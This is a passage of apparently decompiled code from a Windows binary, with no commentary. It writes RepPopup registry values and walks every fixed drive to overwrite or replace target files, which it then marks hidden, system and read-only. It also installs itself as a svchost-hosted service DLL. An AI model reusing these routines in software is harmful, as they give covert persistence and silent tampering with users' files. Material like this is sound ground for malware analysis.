  local_18 = __allmul((uint)lVar7,(uint)((ulonglong)lVar7 >> 0x20),1000,0);
  local_18 = local_18 + (int)(uint)local_28.wMilliseconds;
  uVar5 = 0;
  sVar1 = strlen((char *)param_1);
  uVar5 = FUN_00404fd0(param_1,sVar1 + 1,uVar5);
  LVar2 = RegCreateKeyA((HKEY)0x80000002,s_SOFTWARE_RepPopup_Page_0040e5d8,&local_8);
  if (LVar2 == 0) {
    sprintf(&local_48,s_Open_08X_0040e618,uVar5);
    RegSetValueExA(local_8,&local_48,0,0xb,(BYTE *)&local_18,8);
    RegCloseKey(local_8);
  }
  uVar5 = 0;
  if (*(int *)(local_10 + 0x88) != 0) {
    local_c = 0;
    do {
      piVar3 = (int *)(*(int *)(local_10 + 0xa4) + local_c);
      if (((piVar3[1] != 0) && (*piVar3 == 5)) &&
         (iVar4 = strcmp((char *)piVar3[4],(char *)param_1), iVar4 == 0)) {
        iVar4 = *(int *)(local_10 + 0xa4);
        *(undefined4 *)(iVar4 + 8 + uVar5 * 0x18) = (undefined4)local_18;
        *(undefined4 *)(iVar4 + 0xc + uVar5 * 0x18) = local_18._4_4_;
        return 1;
      }
      local_c = local_c + 0x18;
      uVar5 = uVar5 + 1;
    } while (uVar5 < *(uint *)(local_10 + 0x88));
  }
  return 1;
}



undefined4 __fastcall FUN_004060cd(int param_1)

{
  void **this;
  int *piVar1;
  int iVar2;
  int iVar3;
  uint local_4;
  
  this = (void **)FUN_00403bd4();
  local_4 = 0;
  if (*(int *)(param_1 + 0x88) != 0) {
    iVar3 = 0;
    do {
      piVar1 = (int *)(*(int *)(param_1 + 0xa4) + iVar3);
      if (((piVar1[1] != 0) && (*piVar1 == 7)) &&
         (iVar2 = FUN_00403e5d(this,(char *)piVar1[4],0,1,0), iVar2 != 0)) {
        FUN_0040417e(this,&DAT_0040e62c,&DAT_0040e634);
        FUN_0040417e(this,s_Version_0040e624,(char *)(param_1 + 0x74));
        FUN_0040448b(this,1);
        FUN_00404916(this);
      }
      local_4 = local_4 + 1;
      iVar3 = iVar3 + 0x18;
    } while (local_4 < *(uint *)(param_1 + 0x88));
  }
  FUN_00403c0e((void *)(param_1 + 4),this);
  return 0;
}



undefined4 __thiscall FUN_0040616c(void *this,int *param_1)

{
  uint uVar1;
  LSTATUS LVar2;
  int *piVar3;
  size_t sVar4;
  UINT UVar5;
  int iVar6;
  uint uVar7;
  int iVar8;
  CHAR *lpRootPathName;
  char **ppcVar9;
  undefined4 *puVar10;
  LPCSTR *ppCVar11;
  CHAR local_18c;
  undefined4 local_18b;
  LPCSTR local_88 [26];
  void *local_20;
  DWORD local_1c;
  uint local_18;
  uint local_14;
  undefined4 local_10;
  DWORD local_c;
  HKEY local_8;
  
  iVar8 = 0;
  local_10 = 0;
  local_18 = 0;
  local_14 = 0;
  local_8 = (HKEY)0x0;
  local_1c = 0;
  local_c = 4;
  local_20 = this;
  LVar2 = RegCreateKeyA((HKEY)0x80000002,s_SOFTWARE_RepPopup_0040e5fc,&local_8);
  if (LVar2 == 0) {
    local_c = 8;
    RegQueryValueExA(local_8,s_BootTime_0040e5f0,(LPDWORD)0x0,&local_1c,(LPBYTE)&local_18,&local_c);
    if ((local_18 | local_14) != 0) {
      local_10 = 1;
    }
    RegCloseKey(local_8);
  }
  uVar1 = *(uint *)((int)this + 0x88);
  uVar7 = 0;
  if (uVar1 != 0) {
    piVar3 = *(int **)((int)this + 0xa4);
    do {
      if ((piVar3[1] != 0) && (*piVar3 == 2)) break;
      uVar7 = uVar7 + 1;
      piVar3 = piVar3 + 6;
    } while (uVar7 < uVar1);
  }
  if (uVar7 == uVar1) {
    local_10 = 0;
  }
  else {
    local_18c = '\0';
    ppCVar11 = local_88;
    local_88[0] = (LPCSTR)0x0;
    for (iVar6 = 0x19; ppCVar11 = ppCVar11 + 1, iVar6 != 0; iVar6 = iVar6 + -1) {
      *ppCVar11 = (LPCSTR)0x0;
    }
    puVar10 = &local_18b;
    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {
      *puVar10 = 0;
      puVar10 = puVar10 + 1;
    }
    *(undefined2 *)puVar10 = 0;
    *(undefined *)((int)puVar10 + 2) = 0;
    GetLogicalDriveStringsA(0x104,&local_18c);
    lpRootPathName = &local_18c;
    sVar4 = strlen(&local_18c);
    if (sVar4 != 0) {
      ppCVar11 = local_88;
      do {
        UVar5 = GetDriveTypeA(lpRootPathName);
        if (UVar5 == 3) {
          *ppCVar11 = lpRootPathName;
          iVar8 = iVar8 + 1;
          ppCVar11 = ppCVar11 + 1;
        }
        sVar4 = strlen(lpRootPathName);
        lpRootPathName = lpRootPathName + sVar4 + 1;
        sVar4 = strlen(lpRootPathName);
      } while (sVar4 != 0);
      if (iVar8 != 0) {
        ppcVar9 = local_88 + iVar8;
        do {
          ppcVar9 = ppcVar9 + -1;
          FUN_004062b9(local_20,*ppcVar9,param_1);
          iVar8 = iVar8 + -1;
        } while (iVar8 != 0);
      }
    }
  }
  return local_10;
}



undefined4 __thiscall FUN_004062b9(void *this,char *param_1,int *param_2)

{
  char *_Dest;
  size_t sVar1;
  int *piVar2;
  DWORD DVar3;
  char *pcVar4;
  HANDLE hFindFile;
  BOOL BVar5;
  int iVar6;
  _WIN32_FIND_DATAA *p_Var7;
  undefined4 *puVar8;
  bool bVar9;
  char local_54c;
  undefined4 local_54b;
  _WIN32_FIND_DATAA local_14c;
  uint local_c;
  undefined4 local_8;
  
  _Dest = (char *)operator_new(0x400);
  local_14c.dwFileAttributes = 0;
  local_8 = 0;
  p_Var7 = &local_14c;
  for (iVar6 = 0x4f; p_Var7 = (_WIN32_FIND_DATAA *)&p_Var7->ftCreationTime, iVar6 != 0;
      iVar6 = iVar6 + -1) {
    ((FILETIME *)p_Var7)->dwLowDateTime = 0;
  }
  strcpy(_Dest,param_1);
  sVar1 = strlen(_Dest);
  if (_Dest[sVar1 - 1] != '\\') {
    strcat(_Dest,&DAT_0040e654);
  }
  local_c = 0;
  if (*(int *)((int)this + 0x88) != 0) {
    param_1 = (char *)0x0;
    do {
      piVar2 = (int *)(param_1 + *(int *)((int)this + 0xa4));
      if ((piVar2[1] != 0) && (*piVar2 == 2)) {
        strcat(_Dest,(char *)piVar2[4]);
        DVar3 = GetFileAttributesA(_Dest);
        if (DVar3 != 0xffffffff) {
          pcVar4 = strrchr(_Dest,0x5c);
          pcVar4[1] = '\0';
          sVar1 = strlen(*(char **)(param_1 + *(int *)((int)this + 0xa4) + 0x10));
          strcat(_Dest,(char *)(sVar1 + 1 + *(int *)(param_1 + *(int *)((int)this + 0xa4) + 0x10)));
          DVar3 = GetFileAttributesA(_Dest);
          if (DVar3 == 0xffffffff) {
            iVar6 = FUN_004054b0(this,_Dest,1,*(LPCVOID *)((int)this + 0xa8),
                                 *(uint *)((int)this + 0xac));
            pcVar4 = _Dest;
            if (iVar6 != 0) {
LAB_0040647b:
              SetFileAttributesA(pcVar4,7);
              goto joined_r0x00406485;
            }
          }
          else {
            local_8 = 1;
            SetFileAttributesA(_Dest,0x80);
            iVar6 = FUN_004054b0(this,_Dest,1,*(LPCVOID *)((int)this + 0xa8),
                                 *(uint *)((int)this + 0xac));
            if (iVar6 == 0) {
              local_54c = '\0';
              puVar8 = &local_54b;
              for (iVar6 = 0xff; iVar6 != 0; iVar6 = iVar6 + -1) {
                *puVar8 = 0;
                puVar8 = puVar8 + 1;
              }
              *(undefined2 *)puVar8 = 0;
              *(undefined *)((int)puVar8 + 2) = 0;
              strcpy(&local_54c,_Dest);
              strcat(&local_54c,&DAT_0040e64c);
              iVar6 = FUN_004054b0(this,&local_54c,1,*(LPCVOID *)((int)this + 0xa8),
                                   *(uint *)((int)this + 0xac));
              if (iVar6 != 0) {
                MoveFileExA(&local_54c,_Dest,4);
                pcVar4 = &local_54c;
                goto LAB_0040647b;
              }
            }
            else {
              SetFileAttributesA(_Dest,7);
joined_r0x00406485:
              if (param_2 != (int *)0x0) {
                *param_2 = *param_2 + 1;
              }
            }
          }
        }
        pcVar4 = strrchr(_Dest,0x5c);
        pcVar4[1] = '\0';
      }
      local_c = local_c + 1;
      param_1 = param_1 + 0x18;
    } while (local_c < *(uint *)((int)this + 0x88));
  }
  strcat(_Dest,&DAT_0040e648);
  hFindFile = FindFirstFileA(_Dest,&local_14c);
  bVar9 = hFindFile == (HANDLE)0xffffffff;
  while (!bVar9) {
    if (((((local_14c.dwFileAttributes & 0x10) != 0) &&
         (iVar6 = strcmp(local_14c.cFileName,&DAT_0040e644), iVar6 != 0)) &&
        (iVar6 = strcmp(local_14c.cFileName,&DAT_0040e640), iVar6 != 0)) &&
       (iVar6 = _stricmp(local_14c.cFileName,s_windows_0040e638), iVar6 != 0)) {
      pcVar4 = strrchr(_Dest,0x5c);
      pcVar4[1] = '\0';
      strcat(_Dest,local_14c.cFileName);
      iVar6 = FUN_004062b9(this,_Dest,param_2);
      if (iVar6 != 0) {
        local_8 = 1;
      }
    }
    BVar5 = FindNextFileA(hFindFile,&local_14c);
    bVar9 = BVar5 == 0;
  }
  operator_delete(_Dest);
  return local_8;
}



undefined4 __fastcall FUN_0040657f(undefined4 param_1)

{
  return param_1;
}



DWORD FUN_00406582(uchar **param_1,char *param_2,char *param_3)

{
  size_t sVar1;
  SC_HANDLE hSCManager;
  LSTATUS LVar2;
  BYTE *lpData;
  BOOL BVar3;
  LPSTR lpSubKey;
  int iVar4;
  undefined4 *puVar5;
  uchar *_Str1;
  BYTE local_338;
  undefined4 local_337;
  char local_130;
  undefined4 local_12f;
  DWORD local_2c [2];
  HKEY local_24;
  uchar *local_20;
  HKEY local_1c;
  LPSTR local_18;
  SC_HANDLE local_14;
  HKEY local_10;
  DWORD local_c;
  DWORD local_8;
  
  local_338 = '\0';
  puVar5 = &local_337;
  for (iVar4 = 0x81; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  *(undefined *)((int)puVar5 + 2) = 0;
  local_130 = '\0';
  puVar5 = &local_12f;
  for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  local_8 = 0;
  *(undefined2 *)puVar5 = 0;
  local_18 = (LPCSTR)0x0;
  local_14 = (SC_HANDLE)0x0;
  local_20 = (uchar *)0x0;
  *(undefined *)((int)puVar5 + 2) = 0;
  local_10 = (HKEY)0x0;
  local_1c = (HKEY)0x0;
  local_24 = (HKEY)0x0;
  local_2c[0] = 0;
  local_c = 0;
  if ((param_2 != (char *)0x0) && (sVar1 = strlen(param_2), sVar1 != 0)) {
    sVar1 = strlen(param_2);
    local_18 = (LPSTR)operator_new(sVar1 + 4);
    wsprintfA(local_18,&DAT_0040e6fc,param_2);
  }
  local_20 = param_1[2];
  hSCManager = OpenSCManagerA(local_18,(LPCSTR)0x0,0xf003f);
  if (hSCManager == (SC_HANDLE)0x0) {
LAB_004068cf:
    local_8 = GetLastError();
  }
  else {
    if ((param_3 == (char *)0x0) || (sVar1 = strlen(param_3), sVar1 == 0)) {
      FUN_00406d91(*param_1,&local_130,&local_338,(LPBYTE)0x0);
      sVar1 = strlen(&local_130);
      if (sVar1 != 0) {
        FUN_00407180((char *)*param_1,param_2,(void *)0x0,1);
        FUN_00406b41(*param_1,param_2,0);
      }
      strcpy((char *)&local_338,(char *)param_1[6]);
    }
    else {
      local_8 = RegOpenKeyExA((HKEY)0x80000002,s_SOFTWARE_Microsoft_Windows_NT_Cu_0040e6c4,0,0xf003f
                              ,&local_10);
      if (local_8 != 0) {
        return local_8;
      }
      LVar2 = RegQueryValueExA(local_10,param_3,(LPDWORD)0x0,local_2c,(LPBYTE)0x0,&local_c);
      if (LVar2 == 0) {
        if (local_c < 2) {
          local_c = 1;
        }
        sVar1 = strlen((char *)*param_1);
        local_c = local_c + 1 + sVar1;
        lpData = (BYTE *)operator_new(local_c);
        memset(lpData,0,local_c);
        local_8 = RegQueryValueExA(local_10,param_3,(LPDWORD)0x0,local_2c,lpData,&local_c);
        sVar1 = strlen((char *)lpData);
        _Str1 = lpData;
        while ((sVar1 != 0 && (iVar4 = _mbscmp(_Str1,*param_1), iVar4 != 0))) {
          sVar1 = strlen((char *)_Str1);
          _Str1 = _Str1 + sVar1 + 1;
          sVar1 = strlen((char *)_Str1);
        }
        sVar1 = strlen((char *)_Str1);
        if (sVar1 == 0) {
          strcpy((char *)_Str1,(char *)*param_1);
          sVar1 = strlen((char *)_Str1);
          local_c = local_c + 1 + sVar1;
          local_8 = RegSetValueExA(local_10,param_3,0,local_2c[0],lpData,local_c);
        }
      }
      else {
        sVar1 = strlen((char *)*param_1);
        local_c = sVar1 + 2;
        lpData = (BYTE *)operator_new(local_c);
        memset(lpData,0,local_c);
        strcpy((char *)lpData,(char *)*param_1);
        local_8 = RegSetValueExA(local_10,param_3,0,7,lpData,local_c);
      }
      operator_delete(lpData);
      RegCloseKey(local_10);
      if (local_8 != 0) {
        return local_8;
      }
      wsprintfA((LPSTR)&local_338,s___SystemRoot___System32_svchost__0040e698,param_3);
    }
    local_14 = CreateServiceA(hSCManager,(LPCSTR)*param_1,(LPCSTR)param_1[1],0xf01ff,
                              (DWORD)param_1[3],(DWORD)param_1[4],(DWORD)param_1[5],
                              (LPCSTR)&local_338,(LPCSTR)param_1[7],(LPDWORD)0x0,(LPCSTR)param_1[8],
                              (LPCSTR)param_1[9],(LPCSTR)param_1[10]);
    if (local_14 == (SC_HANDLE)0x0) {
      local_8 = GetLastError();
      if (local_8 == 0x431) {
        local_8 = 0;
        local_14 = OpenServiceA(hSCManager,(LPCSTR)*param_1,0xf01ff);
        if ((local_14 == (SC_HANDLE)0x0) ||
           (BVar3 = ChangeServiceConfigA
                              (local_14,(DWORD)param_1[3],(DWORD)param_1[4],(DWORD)param_1[5],
                               (LPCSTR)&local_338,(LPCSTR)param_1[7],(LPDWORD)0x0,(LPCSTR)param_1[8]
                               ,(LPCSTR)param_1[9],(LPCSTR)param_1[10],(LPCSTR)param_1[1]),
           BVar3 == 0)) {
          local_8 = GetLastError();
        }
      }
      if (local_14 == (SC_HANDLE)0x0) goto LAB_004069a4;
      if (local_8 == 0) goto LAB_004068b7;
    }
    else {
LAB_004068b7:
      if ((local_20 != (uchar *)0x0) &&
         (BVar3 = ChangeServiceConfig2A(local_14,1,&local_20), BVar3 == 0)) goto LAB_004068cf;
    }
  }
  if (local_14 != (SC_HANDLE)0x0) {
    CloseServiceHandle(local_14);
    sVar1 = strlen((char *)*param_1);
    lpSubKey = (LPSTR)operator_new(sVar1 + 0x104);
    wsprintfA(lpSubKey,s_SYSTEM_CurrentControlSet_Service_0040e670,*param_1);
    local_8 = RegOpenKeyExA((HKEY)0x80000002,lpSubKey,0,0xf003f,&local_1c);
    if (local_8 == 0) {
      if ((param_3 == (char *)0x0) || (sVar1 = strlen(param_3), sVar1 == 0)) {
        RegDeleteKeyA(local_1c,s_Parameters_0040e664);
      }
      else {
        local_8 = RegCreateKeyA(local_1c,s_Parameters_0040e664,&local_24);
        if (local_8 == 0) {
          sVar1 = strlen((char *)param_1[6]);
          local_8 = RegSetValueExA(local_24,s_ServiceDll_0040e658,0,2,param_1[6],sVar1 + 1);
          RegCloseKey(local_24);
        }
      }
      RegCloseKey(local_1c);
    }
    operator_delete(lpSubKey);
  }
LAB_004069a4:
  if (hSCManager != (SC_HANDLE)0x0) {
    CloseServiceHandle(hSCManager);
  }
  if (local_18 != (LPCSTR)0x0) {
    operator_delete(local_18);
  }
  return local_8;
}



DWORD FUN_004069ca(char *param_1,char *param_2,char *param_3,char *param_4,undefined4 param_5,
                  undefined4 param_6,char *param_7,char *param_8)

{
  size_t sVar1;
  DWORD DVar2;
  int iVar3;
  char **ppcVar4;
  uchar *local_30;
  char *local_2c [4];
  undefined4 local_1c;
  char *local_18;
  void *local_14;
  void *local_10;
  void *local_c;
  void *local_8;
  
  local_30 = (uchar *)0x0;
  ppcVar4 = local_2c;
  for (iVar3 = 10; iVar3 != 0; iVar3 = iVar3 + -1) {
    *ppcVar4 = (char *)0x0;
    ppcVar4 = ppcVar4 + 1;
  }
  if (param_1 == (char *)0x0) {
LAB_004069f5:
    param_1 = s_TestService_0040e704;
  }
  else {
    sVar1 = strlen(param_1);
    if (sVar1 == 0) goto LAB_004069f5;
  }
  sVar1 = strlen(param_1);
  local_30 = (uchar *)operator_new(sVar1 + 1);
  strcpy((char *)local_30,param_1);
  if (param_2 != (char *)0x0) {
    sVar1 = strlen(param_2);
    local_2c[0] = (char *)operator_new(sVar1 + 1);
    strcpy(local_2c[0],param_2);
  }
  if (param_3 != (char *)0x0) {
    sVar1 = strlen(param_3);
    local_2c[1] = (char *)operator_new(sVar1 + 1);
    strcpy(local_2c[1],param_3);
  }
  if (param_4 != (char *)0x0) {
    sVar1 = strlen(param_4);
    if (sVar1 != 0) {
      sVar1 = strlen(param_4);
      local_18 = (char *)operator_new(sVar1 + 1);
      strcpy(local_18,param_4);
      goto LAB_00406aa2;
    }
  }
  local_18 = (char *)operator_new(0x104);
  GetModuleFileNameA((HMODULE)0x0,local_18,0x104);
LAB_00406aa2:
  local_2c[2] = (char *)param_6;
  local_2c[3] = (char *)param_5;
  local_1c = 1;
  DVar2 = FUN_00406582(&local_30,param_7,param_8);
  if (local_30 != (uchar *)0x0) {
    operator_delete(local_30);
  }
  if (local_2c[0] != (char *)0x0) {
    operator_delete(local_2c[0]);
  }
  if (local_2c[1] != (char *)0x0) {
    operator_delete(local_2c[1]);
  }
  if (local_18 != (char *)0x0) {
    operator_delete(local_18);
  }
  if (local_14 != (void *)0x0) {
    operator_delete(local_14);
  }
  if (local_10 != (void *)0x0) {
    operator_delete(local_10);
  }
  if (local_c != (void *)0x0) {
    operator_delete(local_c);
  }
  if (local_8 != (void *)0x0) {
    operator_delete(local_8);
  }
  return DVar2;
}



DWORD FUN_00406b41(uchar *param_1,char *param_2,int param_3)

{
  size_t sVar1;
  LSTATUS LVar2;
  uchar *_Size;
  LPSTR lpSubKey;
  BOOL BVar3;
  int iVar4;
  DWORD DVar5;
  undefined4 *puVar6;
  uchar *_Str1;
  BYTE local_338;
  undefined4 local_337;
  char local_130;
  undefined4 local_12f;
  LPCSTR local_2c;
  SC_HANDLE local_28;
  LPCSTR local_24 [2];
  DWORD local_1c;
  HKEY local_18;
  SC_HANDLE local_14;
  HKEY local_10;
  LPBYTE local_c;
  DWORD local_8;
  
  local_338 = '\0';
  puVar6 = &local_337;
  for (iVar4 = 0x81; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
  *(undefined2 *)puVar6 = 0;
  *(undefined *)((int)puVar6 + 2) = 0;
  local_130 = '\0';
  puVar6 = &local_12f;
  for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
  *(undefined2 *)puVar6 = 0;
  *(undefined *)((int)puVar6 + 2) = 0;
  DVar5 = 0;
  local_24[0] = (LPCSTR)0x0;
  local_2c = (LPCSTR)0x0;
  local_28 = (SC_HANDLE)0x0;
  local_14 = (SC_HANDLE)0x0;
  local_10 = (HKEY)0x0;
  local_18 = (HKEY)0x0;
  local_1c = 0;
  local_8 = 0;
  FUN_00406d91(param_1,&local_130,&local_338,(LPBYTE)0x0);
  sVar1 = strlen(&local_130);
  if (sVar1 != 0) {
    LVar2 = RegOpenKeyExA((HKEY)0x80000002,s_SOFTWARE_Microsoft_Windows_NT_Cu_0040e6c4,0,0xf003f,
                          &local_10);
    if (LVar2 == 0) {
      LVar2 = RegQueryValueExA(local_10,&local_130,(LPDWORD)0x0,&local_1c,(LPBYTE)0x0,&local_8);
      if (LVar2 == 0) {
        local_c = (LPBYTE)operator_new(local_8);
        memset(local_c,0,local_8);
        RegQueryValueExA(local_10,&local_130,(LPDWORD)0x0,&local_1c,local_c,&local_8);
        _Str1 = local_c;
        sVar1 = strlen((char *)local_c);
        while (sVar1 != 0) {
          iVar4 = _mbscmp(_Str1,param_1);
          if (iVar4 == 0) {
            sVar1 = strlen((char *)_Str1);
            local_8 = local_8 + (-1 - sVar1);
            _Size = local_c + (local_8 - (int)_Str1);
            sVar1 = strlen((char *)_Str1);
            memmove(_Str1,_Str1 + sVar1 + 1,(size_t)_Size);
            RegSetValueExA(local_10,&local_130,0,local_1c,local_c,local_8);
            break;
          }
          sVar1 = strlen((char *)_Str1);
          _Str1 = _Str1 + sVar1 + 1;
          sVar1 = strlen((char *)_Str1);
        }
      }
      RegCloseKey(local_10);
    }
    sVar1 = strlen((char *)param_1);
    lpSubKey = (LPSTR)operator_new(sVar1 + 0x104);
    wsprintfA(lpSubKey,s_SYSTEM_CurrentControlSet_Service_0040e670,param_1);
    DVar5 = RegOpenKeyExA((HKEY)0x80000002,lpSubKey,0,0xf003f,&local_18);
    if (DVar5 == 0) {
      RegDeleteKeyA(local_18,s_Parameters_0040e664);
      RegCloseKey(local_18);
    }
    operator_delete(lpSubKey);
  }
  if (param_3 == 0) {
    DVar5 = FUN_00406faf(&local_28,&local_14,local_24,&local_2c,(char *)param_1,param_2);
    if ((DVar5 == 0) && (local_14 != (SC_HANDLE)0x0)) {
      BVar3 = DeleteService(local_14);
      if (BVar3 == 0) {
        DVar5 = GetLastError();
        if (DVar5 == 0x430) {
          DVar5 = 0;
        }
      }
    }
    FUN_00407067(&local_28,&local_14,local_24,&local_2c);
  }
  return DVar5;
}



LSTATUS FUN_00406d91(uchar *param_1,char *param_2,LPBYTE param_3,LPBYTE param_4)

{
  LSTATUS LVar1;
  size_t sVar2;
  LPSTR lpSubKey;
  int iVar3;
  undefined4 *puVar4;
  CHAR local_130;
  undefined4 local_12f;
  DWORD local_2c;
  DWORD local_28;
  DWORD local_24;
  HKEY local_20;
  LPBYTE local_1c;
  HKEY local_18;
  HKEY local_14;
  LSTATUS local_10;
  uchar *local_c;
  DWORD local_8;
  
  local_130 = '\0';
  puVar4 = &local_12f;
  for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = 0;
  *(undefined *)((int)puVar4 + 2) = 0;
  local_28 = 0;
  local_2c = 0;
  local_18 = (HKEY)0x0;
  local_14 = (HKEY)0x0;
  local_20 = (HKEY)0x0;
  local_24 = 0;
  local_c = (uchar *)0x0;
  local_8 = 0;
  if ((param_2 != (char *)0x0) &&
     (LVar1 = RegOpenKeyExA((HKEY)0x80000002,s_SOFTWARE_Microsoft_Windows_NT_Cu_0040e6c4,0,0xf003f,
                            &local_18), LVar1 == 0)) {
    local_8 = 0x10000;
    local_1c = (LPBYTE)operator_new(0x10000);
    do {
      local_2c = 0x104;
      local_8 = 0x10000;
      local_10 = RegEnumValueA(local_18,local_28,&local_130,&local_2c,(LPDWORD)0x0,&local_24,
                               local_1c,&local_8);
      if (local_10 == 0) {
        local_c = local_1c;
        sVar2 = strlen((char *)local_1c);
        while (sVar2 != 0) {
          iVar3 = _mbscmp(local_c,param_1);
          if (iVar3 == 0) {
            strcpy(param_2,&local_130);
            break;
          }
          sVar2 = strlen((char *)local_c);
          local_c = local_c + sVar2 + 1;
          sVar2 = strlen((char *)local_c);
        }
        sVar2 = strlen((char *)local_c);
        if (sVar2 != 0) break;
      }
      local_28 = local_28 + 1;
    } while (local_10 == 0);
    sVar2 = strlen((char *)local_c);
    if (sVar2 == 0) {
      operator_delete(local_1c);
      RegCloseKey(local_18);
      return local_10;
    }
    operator_delete(local_1c);
    RegCloseKey(local_18);
  }
  sVar2 = strlen((char *)param_1);
  lpSubKey = (LPSTR)operator_new(sVar2 + 0x104);
  wsprintfA(lpSubKey,s_SYSTEM_CurrentControlSet_Service_0040e670,param_1);
  local_10 = RegOpenKeyExA((HKEY)0x80000002,lpSubKey,0,0xf003f,&local_14);
  if (local_10 == 0) {
    if ((param_3 != (LPBYTE)0x0) &&
       (local_10 = RegOpenKeyExA(local_14,s_Parameters_0040e664,0,0xf003f,&local_20), local_10 == 0)
       ) {
      local_8 = 0x208;
      local_10 = RegQueryValueExA(local_20,s_ServiceDll_0040e658,(LPDWORD)0x0,&local_24,param_3,
                                  &local_8);
      RegCloseKey(local_20);
    }
    if (param_4 != (LPBYTE)0x0) {
      local_8 = 0x208;
      local_10 = RegQueryValueExA(local_14,s_ImagePath_0040e710,(LPDWORD)0x0,&local_24,param_4,
                                  &local_8);
    }
    RegCloseKey(local_14);
  }
  operator_delete(lpSubKey);
  return local_10;
}



DWORD FUN_00406faf(SC_HANDLE *param_1,SC_HANDLE *param_2,LPCSTR *param_3,LPCSTR *param_4,
                  char *param_5,char *param_6)

{
  size_t sVar1;
  char *_Dest;
  LPSTR pCVar2;
  SC_HANDLE pSVar3;
  DWORD DVar4;
  
  if ((param_5 == (char *)0x0) || (sVar1 = strlen(param_5), sVar1 == 0)) {
    param_5 = s_TestService_0040e704;
  }
  sVar1 = strlen(param_5);
  _Dest = (char *)operator_new(sVar1 + 1);
  *param_4 = _Dest;
  strcpy(_Dest,param_5);
  if ((param_6 != (char *)0x0) && (sVar1 = strlen(param_6), sVar1 != 0)) {
    sVar1 = strlen(param_6);
    pCVar2 = (LPSTR)operator_new(sVar1 + 4);
    *param_3 = pCVar2;
    wsprintfA(pCVar2,&DAT_0040e6fc,param_6);
  }
  pSVar3 = OpenSCManagerA(*param_3,(LPCSTR)0x0,0xf003f);
  *param_1 = pSVar3;
  if (pSVar3 != (SC_HANDLE)0x0) {
    pSVar3 = OpenServiceA(pSVar3,*param_4,0xf01ff);
    *param_2 = pSVar3;
    if (pSVar3 != (SC_HANDLE)0x0) {
      return 0;
    }
  }
  DVar4 = GetLastError();
  return DVar4;
}



void FUN_00407067(SC_HANDLE *param_1,SC_HANDLE *param_2,void **param_3,void **param_4)

{
  if (*param_2 != (SC_HANDLE)0x0) {
    CloseServiceHandle(*param_2);
  }
  if (*param_1 != (SC_HANDLE)0x0) {
    CloseServiceHandle(*param_1);
  }
  if (*param_3 != (void *)0x0) {
    operator_delete(*param_3);
  }
  if (*param_4 != (void *)0x0) {
    operator_delete(*param_4);
  }
  return;
}



DWORD FUN_004070ae(char *param_1,char *param_2,LPSERVICE_STATUS param_3,DWORD param_4,
                  LPCSTR *param_5)

{
  DWORD DVar1;
  BOOL BVar2;
  int iVar3;
  DWORD *pDVar4;
  _SERVICE_STATUS local_34;
  SC_HANDLE local_14;
  LPCSTR local_10;
  LPCSTR local_c;
  SC_HANDLE local_8;
  
  local_34.dwServiceType = 0;
  local_10 = (LPCSTR)0x0;
  local_c = (LPCSTR)0x0;
  pDVar4 = &local_34.dwCurrentState;
  for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
    *pDVar4 = 0;
    pDVar4 = pDVar4 + 1;
  }
  local_14 = (SC_HANDLE)0x0;
  local_8 = (SC_HANDLE)0x0;
  DVar1 = FUN_00406faf(&local_14,&local_8,&local_10,&local_c,param_1,param_2);
  if ((DVar1 == 0) && (local_8 != (SC_HANDLE)0x0)) {
    BVar2 = StartServiceA(local_8,param_4,param_5);
    if (BVar2 != 0) {
      while ((BVar2 = QueryServiceStatus(local_8,&local_34), BVar2 != 0 &&
             (local_34.dwCurrentState == 2))) {
        Sleep(100);
      }
      if (local_34.dwCurrentState != 4) {
        DVar1 = 0x41d;
      }
      if ((param_3 == (LPSERVICE_STATUS)0x0) ||
         (BVar2 = QueryServiceStatus(local_8,param_3), BVar2 != 0)) goto LAB_0040715f;
    }
    DVar1 = GetLastError();
  }
LAB_0040715f:
  FUN_00407067(&local_14,&local_8,&local_10,&local_c);
  return DVar1;
}



DWORD FUN_00407180(char *param_1,char *param_2,void *param_3,int param_4)

{
  DWORD DVar1;
  
  DVar1 = FUN_004071a3(1,param_1,param_2,param_3,param_4);
  if (DVar1 == 0x426) {
    DVar1 = 0;
  }
  return DVar1;
}



DWORD FUN_004071a3(DWORD param_1,char *param_2,char *param_3,void *param_4,int param_5)

{
  DWORD DVar1;
  BOOL BVar2;
  int iVar3;
  DWORD *pDVar4;
  _SERVICE_STATUS local_34;
  SC_HANDLE local_14;
  LPCSTR local_10;
  LPCSTR local_c;
  SC_HANDLE local_8;
  
  local_34.dwServiceType = 0;
  local_10 = (LPCSTR)0x0;
  local_c = (LPCSTR)0x0;
  pDVar4 = &local_34.dwCurrentState;
  for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
    *pDVar4 = 0;
    pDVar4 = pDVar4 + 1;
  }
  local_14 = (SC_HANDLE)0x0;
  local_8 = (SC_HANDLE)0x0;
  DVar1 = FUN_00406faf(&local_14,&local_8,&local_10,&local_c,param_2,param_3);
  if ((DVar1 == 0) && (local_8 != (SC_HANDLE)0x0)) {
    BVar2 = ControlService(local_8,param_1,&local_34);
    if (BVar2 == 0) {
      DVar1 = GetLastError();
    }
    else {
      if (param_5 != 0) {
        while ((BVar2 = QueryServiceStatus(local_8,&local_34), BVar2 != 0 &&
               (local_34.dwCurrentState == 3))) {
          Sleep(100);
        }
        if (local_34.dwCurrentState == 1) {
          DVar1 = 0;
        }
        else {
          DVar1 = GetLastError();
        }
      }
      if (param_4 != (void *)0x0) {
        memcpy(param_4,&local_34,0x1c);
      }
    }
  }
  FUN_00407067(&local_14,&local_8,&local_10,&local_c);
  return DVar1;
}



undefined4 FUN_00407289(char *param_1,char *param_2)

{
  DWORD DVar1;
  undefined4 uVar2;
  SC_HANDLE local_14;
  LPCSTR local_10;
  LPCSTR local_c;
  SC_HANDLE local_8;
  
  uVar2 = 0;
  local_10 = (LPCSTR)0x0;
  local_c = (LPCSTR)0x0;
